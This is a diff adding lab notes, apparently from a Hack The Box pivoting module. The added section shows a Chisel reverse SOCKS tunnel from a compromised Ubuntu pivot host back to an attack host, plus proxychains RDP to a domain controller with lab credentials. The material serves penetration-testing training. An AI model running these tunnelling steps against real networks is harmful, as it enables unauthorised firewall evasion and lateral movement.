@@ -16,6 +16,7 @@
   - [Port Forwarding with Windows Netsh](#Port-Forwarding-with-Windows-Netsh)
   - [DNS Tunneling with Dnscat2](#DNS-Tunneling-with-Dnscat2)
   - [SOCKS5 Tunneling with Chisel](#SOCKS5-Tunneling-with-Chisel)
+  - [Chisel Reverse Pivot](#Chisel-Reverse-Pivot)
   
   
   
@@ -648,4 +649,56 @@ Suljov@htb[/htb]$ tail -f /etc/proxychains.conf
 # defaults set to "tor"
 # socks4 	127.0.0.1 9050
 socks5 127.0.0.1 1080
+```
+  
+Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+```
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
+  
+### Chisel Reverse Pivot
+
+In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
+
+When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
+
+We'll start the server in our attack host with the option --reverse.
+
+
+Starting the Chisel Server on our Attack Host
+```
+Suljov@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+
+2022/05/30 10:19:16 server: Reverse tunnelling enabled
+2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
+2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
+```
+  
+Then we connect from the Ubuntu (pivot host) to our attack host, using the option R:socks 
+```
+ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
+2022/05/30 14:19:29 client: Handshaking...
+2022/05/30 14:19:30 client: Sending config
+2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
+2022/05/30 14:19:30 client: tun: SSH connected
+```
+
+We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.
+
+```
+Suljov@htb[/htb]$ tail -f /etc/proxychains.conf 
+
+[ProxyList]
+# add proxy here ...
+# socks4    127.0.0.1 9050
+socks5 127.0.0.1 1080 
+```
+
+If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+```
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
